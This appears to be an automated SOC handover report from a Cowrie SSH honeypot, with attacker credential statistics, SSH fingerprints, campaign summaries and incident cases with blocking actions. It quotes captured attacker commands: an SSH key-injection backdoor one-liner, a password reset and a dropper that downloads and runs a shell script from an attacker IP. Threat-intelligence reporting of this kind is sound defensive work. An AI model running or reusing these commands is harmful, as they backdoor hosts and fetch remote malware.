# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-26 |
| **Generated At** | 2026-11-26T20:43:35Z |
| **Shift Time** | 20:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **417** |
| Confirmed Threats | **340** |
| False Positives Filtered | **77** (18.5%) |
| Unique Attacker IPs | **180** |
| Countries of Origin | **45** |
| High Severity Cases | **257** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **160** |
| Malware Samples Analyzed | **9** HIGH · **27** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **5751** |
| Unique Credential Pairs | **1631** |
| Unique Usernames | **439** |
| Unique Passwords | **1089** |
| Successful Auth Pairs | **5630** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 2121 |
| `ubuntu` | 453 |
| `admin` | 146 |
| `user` | 98 |
| `deploy` | 87 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 298 |
| `123` | 163 |
| `1234` | 115 |
| `12345678` | 78 |
| `1` | 74 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 37 |
| `support` | `support` | 31 |
| `root` | `root3245gs5662d34111111111` | 29 |
| `akhilesh` | `C@twOm0n123` | 27 |
| `git` | `git` | 18 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.206.150.95` | 2026-11-26T04:56:26 |
| `b'^\x87x\x13\xa2_\x1dg&\xe8\x81>7c\x1b\xec[\xd1-K0\xbd\xd3{\xddn7\x9d\xd7\x18+\x7f{\x80\xef\xd1q\xb1\xa2\xcd\xf8\x98\xb1\xaa\x99'` | `b'\xe7'` | `35.206.150.95` | 2026-11-26T04:56:27 |
| `support` | `support` | `10.0.0.73` | 2026-11-26T04:56:31 |
| `support` | `support` | `176.53.159.196` | 2026-11-26T05:03:40 |
| `db2inst1` | `db2inst1` | `183.236.25.214` | 2026-11-26T05:10:32 |
| `rootssssss23424123123` | `rootssssss23424123123` | `183.236.25.214` | 2026-11-26T05:10:37 |
| `db2inst1` | `root3245gs5662d34111111111` | `183.236.25.214` | 2026-11-26T05:10:44 |
| `admin` | `1qaz2wsx` | `77.90.185.29` | 2026-11-26T05:10:46 |
| `git` | `git` | `10.0.0.73` | 2026-11-26T05:11:10 |
| `git` | `git` | `77.90.185.29` | 2026-11-26T05:11:40 |
| `root` | `ChangeM3` | `96.78.175.42` | 2026-11-26T05:12:44 |
| `rootssssss23424123123` | `rootssssss23424123123` | `96.78.175.42` | 2026-11-26T05:12:46 |
| `root` | `root3245gs5662d34111111111` | `96.78.175.42` | 2026-11-26T05:12:52 |
| `artem` | `artem` | `103.248.120.6` | 2026-11-26T05:13:37 |
| `345gs5662d34` | `345gs5662d34` | `103.248.120.6` | 2026-11-26T05:13:42 |
| `artem` | `3245gs5662d34` | `103.248.120.6` | 2026-11-26T05:13:47 |
| `root` | `Passw0rd123!@#` | `60.54.77.201` | 2026-11-26T05:18:53 |
| `rootssssss23424123123` | `rootssssss23424123123` | `60.54.77.201` | 2026-11-26T05:18:57 |
| `root` | `root3245gs5662d34111111111` | `60.54.77.201` | 2026-11-26T05:19:03 |
| `root` | `rooot1` | `181.188.176.242` | 2026-11-26T05:23:45 |
_… 5610 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **417** |
| Sessions with Fingerprint | **27** |
| Unique HASSH Fingerprints | **27** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 130 |
| libssh | 87 |
| OpenSSH | 28 |
| Paramiko (Python) | 19 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 80 | 40 |
| `2ec37a7cc8da...` | Mirai/variant | 57 | 3 |
| `472b5de333ad...` | libssh-based | 26 | 1 |
| `4c94058d5e9e...` | libssh-based | 18 | 2 |
| `98ddc5604ef6...` | Modern SSH client | 13 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 80 | 40 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 57 | 3 | Mirai/variant |
| `472b5de333ad...` | OpenSSH | 26 | 1 | libssh-based |
| `4c94058d5e9e...` | Paramiko (Python) | 18 | 2 | libssh-based |
| `98ddc5604ef6...` | Go SSH scanner | 13 | 4 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 13 | 5 | Generic scanner |
| `7d01d047ace6...` | Go SSH scanner | 12 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **106** |
| Campaign Clusters | **5** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 9 | 1 | `T1105, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 41 | 38 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "root\nEOZMjIyuRCkX\nEOZMjIyuRCkX"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `118.196.64.77`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo W$((2+3))X
```
```
(2+3
```
```
echo WOKX
```
```
cd /tmp 2>/dev/null||cd /var/tmp 2>/dev/null||cd /dev/shm 2>/dev/null||cd .;rm -f r.sh;if command -v wget >/dev/null 2>&1; then wget -q --timeout=12 -O r.sh http://45.198.224.75/run.sh; fi;if [ ! -s r.sh ] && command -v curl >/dev/null 2>&1; then curl -fsS --max-time 15 -o r.sh http://45.198.224.75/run.sh; fi;if [ ! -s r.sh ] && command -v busybox >/dev/null 2>&1; then busybox wget -q -O r.sh http://45.198.224.75/run.sh; fi;[ -s r.sh ] || { echo __FAIL_DL__; exit 0; };chmod 777 r.sh 2>/dev/null; chmod +x r.
```
```
wc -c < r.sh 2 > /dev/null
```
Source IPs: `191.217.250.87`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **180** |
| Unique ASNs | **88** |
| High-Risk ASNs | **64** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 56 | HIGH |
| `AS4766` | Korea Telecom | 9 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS198364` | BANATSYNC SRL | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | LOW |
| `AS21826` | Corporación Telemic C.A. | 3 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (238)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-535250433673

| Field | Detail |
|---|---|
| **Source IP** | `35.206.150[.]95` |
| **First Seen** | 2026-11-26 04:56 |
| **Last Seen** | 2026-11-26 04:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 04:56:26` | `cowrie.session.connect` |
| `2026-11-26 04:56:26` | `cowrie.login.success` |
| `2026-11-26 04:56:27` | `cowrie.session.params` |
| `2026-11-26 04:56:27` | `cowrie.command.input` |
| `2026-11-26 04:56:27` | `cowrie.command.input` |
| `2026-11-26 04:56:27` | `cowrie.command.failed` |
| `2026-11-26 04:56:27` | `cowrie.command.input` |
| `2026-11-26 04:56:27` | `cowrie.command.failed` |
| `2026-11-26 04:56:27` | `cowrie.command.input` |
| `2026-11-26 04:56:27` | `cowrie.log.closed` |
| `2026-11-26 04:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.206.150[.]95` to AbuseIPDB if not already reported
- [ ] Block `35.206.150[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f15ce00e97f

| Field | Detail |
|---|---|
| **Source IP** | `35.206.150[.]95` |
| **First Seen** | 2026-11-26 04:56 |
| **Last Seen** | 2026-11-26 04:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 04:56:27` | `cowrie.session.connect` |
| `2026-11-26 04:56:27` | `cowrie.login.success` |
| `2026-11-26 04:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.206.150[.]95` to AbuseIPDB if not already reported
- [ ] Block `35.206.150[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72c831e02a00

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-26 05:03 |
| **Last Seen** | 2026-11-26 05:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:03:40` | `cowrie.session.connect` |
| `2026-11-26 05:03:40` | `cowrie.client.version` |
| `2026-11-26 05:03:40` | `cowrie.client.kex` |
| `2026-11-26 05:03:40` | `cowrie.login.success` |
| `2026-11-26 05:03:40` | `cowrie.direct-tcpip.request` |
| `2026-11-26 05:03:40` | `cowrie.direct-tcpip.data` |
| `2026-11-26 05:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d779ff90b721

| Field | Detail |
|---|---|
| **Source IP** | `183.236.25[.]214` |
| **First Seen** | 2026-11-26 05:10 |
| **Last Seen** | 2026-11-26 05:10 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:10:31` | `cowrie.session.connect` |
| `2026-11-26 05:10:31` | `cowrie.client.version` |
| `2026-11-26 05:10:31` | `cowrie.client.kex` |
| `2026-11-26 05:10:32` | `cowrie.login.success` |
| `2026-11-26 05:10:34` | `cowrie.session.params` |
| `2026-11-26 05:10:34` | `cowrie.command.input` |
| `2026-11-26 05:10:34` | `cowrie.command.failed` |
| `2026-11-26 05:10:34` | `cowrie.log.closed` |
| `2026-11-26 05:10:35` | `cowrie.session.params` |
| `2026-11-26 05:10:35` | `cowrie.command.input` |
| `2026-11-26 05:10:35` | `cowrie.session.file_download` |
| `2026-11-26 05:10:35` | `cowrie.log.closed` |
| `2026-11-26 05:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.236.25[.]214` to AbuseIPDB if not already reported
- [ ] Block `183.236.25[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b504f121c6

| Field | Detail |
|---|---|
| **Source IP** | `183.236.25[.]214` |
| **First Seen** | 2026-11-26 05:10 |
| **Last Seen** | 2026-11-26 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:10:36` | `cowrie.session.connect` |
| `2026-11-26 05:10:36` | `cowrie.client.version` |
| `2026-11-26 05:10:36` | `cowrie.client.kex` |
| `2026-11-26 05:10:37` | `cowrie.login.success` |
| `2026-11-26 05:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.236.25[.]214` to AbuseIPDB if not already reported
- [ ] Block `183.236.25[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4342a5d25228

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]29` |
| **First Seen** | 2026-11-26 05:10 |
| **Last Seen** | 2026-11-26 05:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:10:45` | `cowrie.session.connect` |
| `2026-11-26 05:10:45` | `cowrie.client.version` |
| `2026-11-26 05:10:46` | `cowrie.client.kex` |
| `2026-11-26 05:10:46` | `cowrie.login.success` |
| `2026-11-26 05:10:46` | `cowrie.direct-tcpip.request` |
| `2026-11-26 05:10:46` | `cowrie.direct-tcpip.ja4` |
| `2026-11-26 05:10:46` | `cowrie.direct-tcpip.data` |
| `2026-11-26 05:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e76183a13f

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]42` |
| **First Seen** | 2026-11-26 05:12 |
| **Last Seen** | 2026-11-26 05:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:12:44` | `cowrie.session.connect` |
| `2026-11-26 05:12:44` | `cowrie.client.version` |
| `2026-11-26 05:12:44` | `cowrie.client.kex` |
| `2026-11-26 05:12:44` | `cowrie.login.success` |
| `2026-11-26 05:12:45` | `cowrie.session.params` |
| `2026-11-26 05:12:45` | `cowrie.command.input` |
| `2026-11-26 05:12:45` | `cowrie.command.failed` |
| `2026-11-26 05:12:45` | `cowrie.log.closed` |
| `2026-11-26 05:12:46` | `cowrie.session.params` |
| `2026-11-26 05:12:46` | `cowrie.command.input` |
| `2026-11-26 05:12:46` | `cowrie.session.file_download` |
| `2026-11-26 05:12:46` | `cowrie.log.closed` |
| `2026-11-26 05:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]42` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bfdae8425c3

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]42` |
| **First Seen** | 2026-11-26 05:12 |
| **Last Seen** | 2026-11-26 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:12:46` | `cowrie.session.connect` |
| `2026-11-26 05:12:46` | `cowrie.client.version` |
| `2026-11-26 05:12:46` | `cowrie.client.kex` |
| `2026-11-26 05:12:46` | `cowrie.login.success` |
| `2026-11-26 05:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]42` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e38f6c446d

| Field | Detail |
|---|---|
| **Source IP** | `103.248.120[.]6` |
| **First Seen** | 2026-11-26 05:13 |
| **Last Seen** | 2026-11-26 05:13 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:13:36` | `cowrie.session.connect` |
| `2026-11-26 05:13:36` | `cowrie.client.version` |
| `2026-11-26 05:13:36` | `cowrie.client.kex` |
| `2026-11-26 05:13:37` | `cowrie.login.success` |
| `2026-11-26 05:13:38` | `cowrie.session.params` |
| `2026-11-26 05:13:38` | `cowrie.command.input` |
| `2026-11-26 05:13:38` | `cowrie.command.failed` |
| `2026-11-26 05:13:39` | `cowrie.log.closed` |
| `2026-11-26 05:13:40` | `cowrie.session.params` |
| `2026-11-26 05:13:40` | `cowrie.command.input` |
| `2026-11-26 05:13:40` | `cowrie.session.file_download` |
| `2026-11-26 05:13:40` | `cowrie.log.closed` |
| `2026-11-26 05:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.248.120[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.248.120[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d515195e55d

| Field | Detail |
|---|---|
| **Source IP** | `103.248.120[.]6` |
| **First Seen** | 2026-11-26 05:13 |
| **Last Seen** | 2026-11-26 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:13:41` | `cowrie.session.connect` |
| `2026-11-26 05:13:41` | `cowrie.client.version` |
| `2026-11-26 05:13:41` | `cowrie.client.kex` |
| `2026-11-26 05:13:42` | `cowrie.login.success` |
| `2026-11-26 05:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.248.120[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.248.120[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3f3e9aa5d53

| Field | Detail |
|---|---|
| **Source IP** | `60.54.77[.]201` |
| **First Seen** | 2026-11-26 05:18 |
| **Last Seen** | 2026-11-26 05:19 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:18:52` | `cowrie.session.connect` |
| `2026-11-26 05:18:52` | `cowrie.client.version` |
| `2026-11-26 05:18:52` | `cowrie.client.kex` |
| `2026-11-26 05:18:53` | `cowrie.login.success` |
| `2026-11-26 05:18:54` | `cowrie.session.params` |
| `2026-11-26 05:18:54` | `cowrie.command.input` |
| `2026-11-26 05:18:54` | `cowrie.command.failed` |
| `2026-11-26 05:18:55` | `cowrie.log.closed` |
| `2026-11-26 05:18:55` | `cowrie.session.params` |
| `2026-11-26 05:18:55` | `cowrie.command.input` |
| `2026-11-26 05:18:56` | `cowrie.session.file_download` |
| `2026-11-26 05:18:56` | `cowrie.log.closed` |
| `2026-11-26 05:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.54.77[.]201` to AbuseIPDB if not already reported
- [ ] Block `60.54.77[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b099e6c1000

| Field | Detail |
|---|---|
| **Source IP** | `60.54.77[.]201` |
| **First Seen** | 2026-11-26 05:18 |
| **Last Seen** | 2026-11-26 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:18:56` | `cowrie.session.connect` |
| `2026-11-26 05:18:56` | `cowrie.client.version` |
| `2026-11-26 05:18:56` | `cowrie.client.kex` |
| `2026-11-26 05:18:57` | `cowrie.login.success` |
| `2026-11-26 05:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.54.77[.]201` to AbuseIPDB if not already reported
- [ ] Block `60.54.77[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5be1ecd77d4

| Field | Detail |
|---|---|
| **Source IP** | `181.188.176[.]242` |
| **First Seen** | 2026-11-26 05:23 |
| **Last Seen** | 2026-11-26 05:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:23:45` | `cowrie.session.connect` |
| `2026-11-26 05:23:45` | `cowrie.client.version` |
| `2026-11-26 05:23:45` | `cowrie.client.kex` |
| `2026-11-26 05:23:45` | `cowrie.login.success` |
| `2026-11-26 05:23:46` | `cowrie.session.params` |
| `2026-11-26 05:23:46` | `cowrie.command.input` |
| `2026-11-26 05:23:46` | `cowrie.command.failed` |
